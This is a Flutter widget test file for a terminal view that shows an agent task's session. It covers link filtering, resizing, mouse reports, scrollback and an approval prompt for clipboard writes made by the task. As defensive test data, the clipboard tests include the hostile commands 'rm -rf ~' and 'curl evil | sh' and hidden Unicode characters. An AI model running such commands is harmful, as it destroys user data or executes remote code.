import 'dart:async';
import 'dart:convert';

import 'package:flutter/gestures.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:porelo_frontend/src/ui/terminal_look.dart';
import 'package:porelo_frontend/src/ui/tokens.dart';
import 'package:porelo_frontend/src/app/machines.dart';
import 'package:porelo_frontend/src/app/pty.dart';
import 'package:porelo_frontend/src/app/session.dart';
import 'package:porelo_frontend/src/ui/session_terminal.dart';
import 'package:porelo_frontend/src/ui/session_view.dart';
import 'package:xterm/xterm.dart';

import '../support/terminal_drag.dart';

/// A task's terminal in the interface, as walk 21 found it wanting.
///
/// The harms: a button that sends the browser to an address only the container reaches; an earlier
/// start's screen read as the agent's answer now; a press the program never sees released, and a
/// selection it then wipes; and a program reading this computer's clipboard.
void main() {
  late CopyToClipboard before;
  late List<String> copied;
  setUp(() {
    before = copyToClipboard;
    copied = <String>[];
    copyToClipboard = (text) async => copied.add(text);
  });
  tearDown(() => copyToClipboard = before);

  void atTheTestSize(WidgetTester tester) {
    tester.view.physicalSize = const Size(1280, 800);
    tester.view.devicePixelRatio = 1;
    addTearDown(tester.view.reset);
  }

  Future<(Session, _Channel)> open(WidgetTester tester, {DateTime? startedAt}) async {
    final channel = _Channel();
    final session = Session(
      task: 'porelo-sluice-dry-sluice',
      machine: const Machine(name: 'laptop', socketPath: ''),
      open: (executable, arguments, {int columns = 80, int rows = 24}) => channel,
      startedAt: startedAt,
    );
    atTheTestSize(tester);
    final focus = FocusNode();
    addTearDown(focus.dispose);
    await tester.pumpWidget(
      MaterialApp(
        home: Scaffold(
          body: SessionView(session: session, focusNode: focus),
        ),
      ),
    );
    await tester.pump();
    addTearDown(session.leave);
    return (session, channel);
  }

  Future<void> prints(WidgetTester tester, _Channel channel, String words) async {
    channel.prints(words);
    // The output arrives after the first frame; what it changed is drawn in the next.
    await tester.pump();
    await tester.pump();
  }

  bool offered(String address) => find.byKey(ValueKey<String>('terminal-link $address')).evaluate().isNotEmpty;

  testWidgets('a link only the container reaches, or still a template, is not offered; one this computer reaches is', (
    tester,
  ) async {
    final (_, channel) = await open(tester);
    const inside = <String>[
      'http://host.containers.internal/sluice.git',
      'http://host.containers.internal./sluice.git',
      'http://localhost:8080/',
      'http://app.localhost:3000/',
      'http://127.0.0.1:8000/',
      'http://[::1]:8000/',
      'http://0.0.0.0:8000/',
      'http://gate/sluice.git',
    ];
    const templates = <String>[
      r'https://github.com/mvdan/sh/releases/download/v/$VERSION/shfmt_v/$%7BVERSION%7D_linux_amd64',
      r'https://example.org/${name}.tar.gz',
      'https://example.org/%7bname%7d.tar.gz',
    ];
    const outside = <String>[
      'https://github.com/example/sluice/pull/1',
      'https://127.example.com/',
      'http://192.0.2.10/',
    ];
    for (final address in <String>[...inside, ...templates, ...outside]) {
      await prints(tester, channel, '\x1b]8;;$address\x1b\\$address\x1b]8;;\x1b\\\r\n');
    }

    for (final address in inside) {
      expect(offered(address), isFalse, reason: 'the laptop’s browser cannot reach $address inside the task');
    }
    expect(find.textContaining('only reachable inside the task'), findsNothing, reason: 'not listed at all');
    for (final printed in <String>['shfmt', 'tar.gz']) {
      expect(
        find.textContaining(printed),
        findsNothing,
        reason: 'an address with its variables unexpanded leads nowhere',
      );
    }
    for (final address in outside) {
      expect(offered(address), isTrue, reason: '$address is reached from this computer and keeps its button');
    }
  });

  // Harm: the agent's screen stays small in a grown window, or the session is told the same size again and again.
  testWidgets('a grown window sends the session its new size once, and a redraw sends none', (tester) async {
    final (_, channel) = await open(tester);
    final first = List<String>.of(channel.sizes);
    expect(first, isNotEmpty, reason: 'the first size reaches the session');
    await prints(tester, channel, 'some output\r\n');
    await tester.pump(const Duration(milliseconds: 100));
    expect(channel.sizes, first, reason: 'a redraw at the same size sends nothing');
    tester.view.physicalSize = const Size(1600, 1000);
    await tester.pump();
    await tester.pump(const Duration(milliseconds: 100));
    final grown = channel.sizes.sublist(first.length);
    expect(grown, hasLength(1), reason: 'one new size: $grown');
    final columns = int.parse(grown.single.split('x').first);
    expect(columns, greaterThan(int.parse(first.last.split('x').first)));
  });

  testWidgets('a task’s terminal says when the task was started, and nothing where that is unknown', (tester) async {
    await open(tester, startedAt: DateTime(2026, 10, 28, 20, 10));
    expect(
      find.textContaining('porelo-sluice-dry-sluice, started 20:10'),
      findsOneWidget,
      reason: 'what the agent redraws from before a restart must not read as now',
    );

    await tester.pumpWidget(const SizedBox());
    await open(tester);
    expect(find.byKey(const Key('session-started')), findsNothing);
  });

  // Harm: an agent asking what its background is hears nothing, and picks colours for a light one.
  testWidgets('a program asking for the colours hears those of the dark terminal', (tester) async {
    expect(TerminalLook.darkConsole.background, const Color(0xFF05050C), reason: 'what it hears is what it gets');
    expect(TerminalLook.darkConsole.foreground, const Color(0xFFE8ECFF));
    final (_, channel) = await open(tester);
    await prints(tester, channel, '\x1b]11;?\x07\x1b]10;?\x07');
    expect(channel.sent, contains('\x1b]11;rgb:0505/0505/0c0c\x1b\\'));
    expect(channel.sent, contains('\x1b]10;rgb:e8e8/ecec/ffff\x1b\\'));
  });

  group('the mouse, while the program asked for mouse reports', () {
    const mouseReports = '\x1b[?1000h\x1b[?1006h';

    Offset cell(WidgetTester tester, int column) =>
        tester.getTopLeft(find.byKey(const Key('terminal'))) + Offset(Sizes.terminalSide + 4 + column * 8.0, 16);

    TerminalController selection(WidgetTester tester) =>
        tester.widget<TerminalView>(find.byKey(const Key('terminal'))).controller!;

    testWidgets('Shift+drag selects here and sends the program nothing', (tester) async {
      final (_, channel) = await open(tester);
      await prints(tester, channel, '${mouseReports}hello world');

      await tester.sendKeyDownEvent(LogicalKeyboardKey.shiftLeft);
      final drag = await tester.startGesture(cell(tester, 0), kind: PointerDeviceKind.mouse);
      // Held past the press timeout before it moves, as a hand does: only then is the press reported.
      await tester.pump(const Duration(milliseconds: 200));
      await drag.moveTo(cell(tester, 4));
      await tester.pump();
      await drag.moveTo(cell(tester, 8));
      await drag.up();
      await tester.sendKeyUpEvent(LogicalKeyboardKey.shiftLeft);
      await tester.pump(const Duration(milliseconds: 500));

      expect(selection(tester).selection, isNotNull, reason: 'the drag selects in the interface');
      expect(channel.sent.where((each) => each.startsWith('\x1b[<')), isEmpty, reason: 'no mouse report');

      // Then a plain click, in the same terminal: the Shift gesture left nothing suspended.
      await tester.tapAt(cell(tester, 2), kind: PointerDeviceKind.mouse);
      await tester.pump(const Duration(milliseconds: 500));
      final reports = channel.sent.where((each) => each.startsWith('\x1b[<0;')).toList();
      expect(reports.map((each) => each[each.length - 1]), <String>['M', 'm'], reason: 'press, then release');
    });

    testWidgets('a plain drag is the program’s whole where it asked for motion, and selects nothing here', (
      tester,
    ) async {
      final (_, channel) = await open(tester);
      await prints(tester, channel, '\x1b[?1000h\x1b[?1002h\x1b[?1006hhello world');

      final drag = await tester.startGesture(cell(tester, 0), kind: PointerDeviceKind.mouse);
      await tester.pump(const Duration(milliseconds: 200));
      await drag.moveTo(cell(tester, 4));
      await tester.pump();
      await drag.moveTo(cell(tester, 8));
      await tester.pump();
      await drag.up();
      await tester.pump(const Duration(milliseconds: 500));

      final reports = channel.sent.where((each) => each.startsWith('\x1b[<')).toList();
      expect(reports.first, startsWith('\x1b[<0;1;'), reason: 'the press, where the drag began');
      expect(reports.first, endsWith('M'));
      final motions = reports.where((each) => each.startsWith('\x1b[<32;')).toList();
      expect(motions, hasLength(2), reason: 'each motion to another cell, the button held');
      expect(
        reports.last,
        motions.last.replaceFirst('<32;', '<0;').replaceFirst(RegExp(r'M$'), 'm'),
        reason: 'the release, where the drag ended',
      );
      expect(selection(tester).selection, isNull, reason: 'tmux selects, not the window');
    });

    // The terminal's own measures, so a turn and a cell are exactly what it counts.
    ({double line, double column}) measures(WidgetTester tester) {
      final render = tester.state<TerminalViewState>(find.byKey(const Key('terminal'))).renderTerminal;
      return (line: render.lineHeight, column: render.cellSize.width);
    }

    Offset screenCell(WidgetTester tester, int column, int row) {
      final size = measures(tester);
      return tester.getTopLeft(find.byKey(const Key('terminal'))) +
          Offset(Sizes.terminalSide + (column + 0.5) * size.column, Space.normal + (row + 0.5) * size.line);
    }

    Future<List<String>> turns(WidgetTester tester, _Channel channel, Offset at, List<double> deltas) async {
      final before = channel.sent.length;
      for (final delta in deltas) {
        await tester.sendEventToBinding(PointerScrollEvent(position: at, scrollDelta: Offset(0, delta)));
        await tester.pump();
      }
      return channel.sent.sublist(before);
    }

    String history(int count) => [for (var line = 0; line < count; line++) 'line $line\r\n'].join();

    // Harm: the task's tmux asks for the mouse and keeps the history itself, so a wheel the window answers on its own
    // scrolls nothing, reaches the agent as arrow keys, or names a row of the window's history the program never had.
    for (final (screen, enter) in [('its own screen', '\x1b[?1049h'), ('the main screen', '')]) {
      testWidgets('the wheel reaches the program as wheel reports at the screen row on $screen', (tester) async {
        final (_, channel) = await open(tester);
        await prints(tester, channel, '$enter${history(200)}$mouseReports');
        await tester.pump();
        final line = measures(tester).line;
        final sent = await turns(tester, channel, screenCell(tester, 0, 4), [-line, line]);
        expect(sent, ['\x1b[<64;1;5M', '\x1b[<65;1;5M'], reason: 'up is 64, down 65, on the fifth row of the screen');
      });
    }

    testWidgets('a program that asked for plain reports hears the wheel at its cell, rows counted from one', (
      tester,
    ) async {
      final (_, channel) = await open(tester);
      await prints(tester, channel, '\x1b[?1049h\x1b[?1000h');
      final line = measures(tester).line;
      final sent = await turns(tester, channel, screenCell(tester, 1, 2), [-line]);
      expect(sent, [
        '\x1b[M${String.fromCharCode(32 + 64)}${String.fromCharCode(32 + 2)}${String.fromCharCode(32 + 3)}',
      ]);
    });

    // Harm: a fine wheel's many small turns each became a report, and one notch scrolled tmux many times.
    testWidgets('small turns add up to one report a line', (tester) async {
      final (_, channel) = await open(tester);
      await prints(tester, channel, '\x1b[?1049h$mouseReports');
      final line = measures(tester).line;
      final sent = await turns(tester, channel, screenCell(tester, 0, 0), [-line / 4, -line / 4, -line / 4, -line / 4]);
      expect(sent, ['\x1b[<64;1;1M']);
    });

    testWidgets('the wheel with Shift held says so in the report', (tester) async {
      final (_, channel) = await open(tester);
      await prints(tester, channel, '\x1b[?1049h$mouseReports');
      final line = measures(tester).line;
      await tester.sendKeyDownEvent(LogicalKeyboardKey.shiftLeft);
      final sent = await turns(tester, channel, screenCell(tester, 0, 0), [-line]);
      await tester.sendKeyUpEvent(LogicalKeyboardKey.shiftLeft);
      expect(sent, ['\x1b[<68;1;1M'], reason: 'shift adds 4 to the button');
    });

    // Harm: a session that has ended still claims the wheel for a program that is gone, and its lines cannot be read.
    testWidgets('a session that has ended scrolls its own lines with the wheel', (tester) async {
      final (session, channel) = await open(tester);
      await prints(tester, channel, '${history(200)}$mouseReports');
      channel.ends();
      await tester.pump();
      await tester.pump();
      expect(session.live, isFalse);
      final position = tester
          .state<ScrollableState>(
            find.descendant(of: find.byKey(const Key('terminal')), matching: find.byType(Scrollable)).first,
          )
          .position;
      final sent = await turns(tester, channel, screenCell(tester, 0, 4), [-400]);
      expect(sent, isEmpty);
      expect(position.pixels, lessThan(position.maxScrollExtent));
    });

    testWidgets('a plain click still reaches the program, its press and its release', (tester) async {
      final (_, channel) = await open(tester);
      await prints(tester, channel, '${mouseReports}hello world');

      await tester.tapAt(cell(tester, 2), kind: PointerDeviceKind.mouse);
      await tester.pump(const Duration(milliseconds: 500));

      final reports = channel.sent.where((each) => each.startsWith('\x1b[<0;')).toList();
      expect(reports.map((each) => each[each.length - 1]), <String>['M', 'm'], reason: 'press, then release');
    });
  });

  group('reading back while the agent writes', () {
    ScrollPosition screen(WidgetTester tester) => tester
        .state<ScrollableState>(
          find.descendant(of: find.byKey(const Key('terminal')), matching: find.byType(Scrollable)).first,
        )
        .position;

    Future<void> lines(WidgetTester tester, _Channel channel, int from, int to) async {
      await prints(tester, channel, [for (var line = from; line < to; line++) 'line $line\r\n'].join());
      await tester.pump();
    }

    Future<void> wheelUp(WidgetTester tester) async {
      final at = tester.getCenter(find.byKey(const Key('terminal')));
      await tester.sendEventToBinding(PointerScrollEvent(position: at, scrollDelta: const Offset(0, -400)));
      await tester.pump();
    }

    Finder jump() => find.byKey(const Key('terminal-jump-to-latest'));

    // Harm: the person cannot read back what the agent wrote while it keeps writing, nor find the way back to now.
    testWidgets('the wheel goes into the history, new output leaves the view, and Jump to latest returns', (
      tester,
    ) async {
      final (_, channel) = await open(tester);
      await lines(tester, channel, 0, 200);
      expect(screen(tester).pixels, screen(tester).maxScrollExtent, reason: 'it starts at the latest');
      expect(jump(), findsNothing, reason: 'nothing to jump to while at the latest');

      await wheelUp(tester);
      final read = screen(tester).pixels;
      expect(read, lessThan(screen(tester).maxScrollExtent), reason: 'the wheel goes into the history');
      expect(jump(), findsOneWidget, reason: 'the way back shows while scrolled back');

      await lines(tester, channel, 200, 260);
      expect(screen(tester).pixels, read, reason: 'new output does not pull the view down');
      expect(jump(), findsOneWidget);

      await tester.tap(jump());
      await tester.pump();
      expect(screen(tester).pixels, screen(tester).maxScrollExtent, reason: 'Jump to latest goes to the end');
      expect(jump(), findsNothing);
      await lines(tester, channel, 260, 300);
      expect(screen(tester).pixels, screen(tester).maxScrollExtent, reason: 'at the end it follows again');
    });

    testWidgets('scrolling back to the end follows again and puts the button away', (tester) async {
      final (_, channel) = await open(tester);
      await lines(tester, channel, 0, 200);
      await wheelUp(tester);
      expect(jump(), findsOneWidget);
      screen(tester).jumpTo(screen(tester).maxScrollExtent);
      await tester.pump();
      expect(jump(), findsNothing);
      await lines(tester, channel, 200, 260);
      expect(screen(tester).pixels, screen(tester).maxScrollExtent);
    });

    // Harm: a person a few pixels short of the end neither followed nor saw the way back.
    testWidgets('a few pixels short of the end shows the way back', (tester) async {
      final (_, channel) = await open(tester);
      await lines(tester, channel, 0, 200);
      screen(tester).jumpTo(screen(tester).maxScrollExtent - 3);
      await tester.pump();
      expect(jump(), findsOneWidget);
    });
  });

  String write(String text) => '\x1b]52;c;${base64.encode(utf8.encode(text))}\x07';
  final ask = find.byKey(const Key('terminal-copy-ask'));
  final allow = find.byKey(const Key('terminal-copy-allow'));
  final refuse = find.byKey(const Key('terminal-copy-refuse'));
  String preview(WidgetTester tester) =>
      tester.widget<SelectableText>(find.byKey(const Key('terminal-copy-preview'))).data!;
  String size(WidgetTester tester) => tester.widget<Text>(find.byKey(const Key('terminal-copy-size'))).data!;

  testWidgets('what the program copies of a drag across its text is asked about, and a read gets no answer', (
    tester,
  ) async {
    final (_, channel) = await open(tester);
    await prints(tester, channel, '\x1b[2J\x1b[Hgit log --oneline');
    await dragAcrossTheTopLine(tester, find.byKey(const Key('terminal')), 'git log --oneline'.length);
    await prints(tester, channel, write('git log --oneline'));
    expect(copied, isEmpty);
    expect(preview(tester), 'git log --oneline');

    await prints(tester, channel, '\x1b]52;c;?\x07');
    expect(copied, isEmpty, reason: 'a read copies nothing');
    expect(channel.sent.where((each) => each.contains(']52')), isEmpty, reason: 'nor is it answered');
  });

  group('a copy the task makes by itself', () {
    // Harm: text the task chose lands on the clipboard and runs in the shell it is pasted into.
    testWidgets('asks with its size and a preview that shows its line breaks', (tester) async {
      final (_, channel) = await open(tester);
      await prints(tester, channel, write('ls\nrm -rf ~\n'));

      expect(copied, isEmpty);
      expect(ask, findsOneWidget);
      expect(size(tester), contains('12 characters in 2 lines, ending in a line break'));
      expect(preview(tester), 'ls⏎\nrm -rf ~⏎');
    });

    // Harm: what would run hides from the preview, or behind a long middle.
    testWidgets('shows the characters that would not show, and shortens a long one in the middle', (tester) async {
      final (_, channel) = await open(tester);
      await prints(tester, channel, write('ok\u200b\u202e\u00a0\t\x1b[31m\u{E0041}\uFE0F'));
      expect(preview(tester), 'ok⟨U+200B⟩⟨U+202E⟩⟨U+00A0⟩⇥␛[31m⟨U+E0041⟩⟨U+FE0F⟩');

      final lines = <String>[for (var i = 0; i < 40; i++) 'line $i', 'curl evil | sh'];
      await prints(tester, channel, write(lines.join('\n')));
      final shown = preview(tester);
      expect(shown, startsWith('line 0⏎\n'));
      expect(shown, contains('left out'));
      expect(shown, isNot(contains('line 20')));
      expect(shown, endsWith('curl evil | sh'), reason: 'the last line always shows');
      expect(size(tester), contains('41 lines, with no line break at the end'));

      await tester.tap(find.byKey(const Key('terminal-copy-whole')));
      await tester.pump();
      expect(
        tester.widget<SelectableText>(find.byKey(const Key('terminal-copy-whole-text'))).data,
        contains('line 20⏎'),
        reason: 'the whole of it can be read',
      );
    });

    testWidgets('is not copied when refused, and copied when allowed', (tester) async {
      final (_, channel) = await open(tester);
      await prints(tester, channel, write('refused'));
      await tester.tap(refuse);
      await tester.pump();
      expect(copied, isEmpty);
      expect(ask, findsNothing);

      await prints(tester, channel, write('allowed'));
      await tester.tap(allow);
      await tester.pump();
      expect(copied, <String>['allowed']);
      expect(ask, findsNothing);
    });

    // Harm: a press on the copy shown copies another that replaced it under the pointer.
    testWidgets('a newer one replaces the question, and the press on the old one copies nothing', (tester) async {
      final (_, channel) = await open(tester);
      await prints(tester, channel, write('shown'));
      final press = await tester.startGesture(tester.getCenter(allow));
      await prints(tester, channel, write('slipped in'));
      await press.up();
      await tester.pump();
      expect(copied, isEmpty);
      expect(preview(tester), 'slipped in');
    });

    // Harm: Enter typed for the far end copies what the task wrote.
    testWidgets('Copy never takes the keyboard, so Enter never presses it', (tester) async {
      final (_, channel) = await open(tester);
      await prints(tester, channel, write('by Enter'));
      final button = Focus.of(tester.element(find.descendant(of: allow, matching: find.text('Copy'))));
      button.requestFocus();
      await tester.pump();
      await tester.sendKeyEvent(LogicalKeyboardKey.enter);
      await tester.pump();
      expect(button.hasFocus, isFalse);
      expect(copied, isEmpty);
    });

    // Harm: Space typed for the far end copies what the task wrote.
    testWidgets('Copy never takes the keyboard, so Space never presses it', (tester) async {
      final (_, channel) = await open(tester);
      await prints(tester, channel, write('by Space'));
      final button = Focus.of(tester.element(find.descendant(of: allow, matching: find.text('Copy'))));
      button.requestFocus();
      await tester.pump();
      await tester.sendKeyEvent(LogicalKeyboardKey.space);
      await tester.pump();
      expect(button.hasFocus, isFalse);
      expect(copied, isEmpty);
    });
  });

  group('the preview of a copy', () {
    // Harm: a character that shows as nothing, or two texts that look alike, pass the person's check unseen.
    test('marks every default-ignorable character and every combining mark', () {
      const hidden = <int>[
        0x17B4, 0x17B5, 0x180B, 0x180C, 0x180D, 0x180F, 0x2065, 0xFFF0, 0x1BCA0, 0x1D173, 0xE0001, 0xE01F0, 0x3164, //
      ];
      for (final rune in hidden) {
        expect(
          CopyPreview.of('a${String.fromCharCode(rune)}b').preview,
          'a⟨U+${rune.toRadixString(16).toUpperCase().padLeft(4, '0')}⟩b',
          reason: 'U+${rune.toRadixString(16)}',
        );
      }
      expect(CopyPreview.of('é').preview, 'e⟨U+0301⟩', reason: 'é written as e and a combining accent');
      expect(CopyPreview.of('é').preview, 'é');
    });

    // Harm: the size said left out is the display's, not what lands on the clipboard.
    test('counts what is left out on the text copied, and never splits a marker', () {
      final lines = <String>[for (var i = 0; i < 40; i++) 'z\u200b$i', 'last'];
      final leftOut = lines.sublist(6, 40).fold<int>(0, (sum, line) => sum + line.runes.length + 1);
      expect(CopyPreview.of(lines.join('\n')).preview, contains('… $leftOut characters in 34 lines left out …'));

      final long = CopyPreview.of('\u200b' * 1300).preview;
      expect(long, contains('… 1100 characters left out …'));
      expect('⟨U+200B⟩'.allMatches(long), hasLength(200));
      expect(long.replaceAll('⟨U+200B⟩', ''), isNot(contains(RegExp('[⟨⟩]'))), reason: 'no marker cut in two');

      final wide = CopyPreview.of(
        <String>['\u200b' * 250, 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n'].join('\n'),
      ).preview;
      expect(wide, contains('… 50 more characters'));
      expect(wide.replaceAll('⟨U+200B⟩', ''), isNot(contains(RegExp('[⟨⟩]'))));
    });

    // Harm: a carriage return runs a line in a shell as a newline does, unsaid.
    test('says a text ends in a line break for CR, LF and CRLF alike', () {
      for (final end in <String>['\r', '\n', '\r\n']) {
        expect(CopyPreview.of('ls$end').size, contains('1 line, ending in a line break'), reason: end.codeUnits.join());
      }
      expect(CopyPreview.of('a\rb').size, contains('2 lines, with no line break at the end'));
      expect(CopyPreview.of('a\rb\r\nc').preview, 'a␍\nb␍⏎\nc');
    });
  });
}

class _Channel implements SessionChannel {
  final List<String> sent = <String>[];
  final StreamController<List<int>> _output = StreamController<List<int>>.broadcast();
  final Completer<int> _ended = Completer<int>();

  void prints(String words) => _output.add(utf8.encode(words));

  /// The far end ends, as a session does when its work stops.
  void ends() {
    if (!_ended.isCompleted) _ended.complete(0);
  }

  @override
  Stream<List<int>> get output => _output.stream;

  @override
  void send(String input) => sent.add(input);

  /// Every size sent, as `columnsxrows`.
  final List<String> sizes = <String>[];

  @override
  void resize({required int columns, required int rows}) => sizes.add('${columns}x$rows');

  @override
  Future<int> get ended => _ended.future;

  @override
  Future<void> close() async {
    if (!_ended.isCompleted) _ended.complete(0);
  }
}
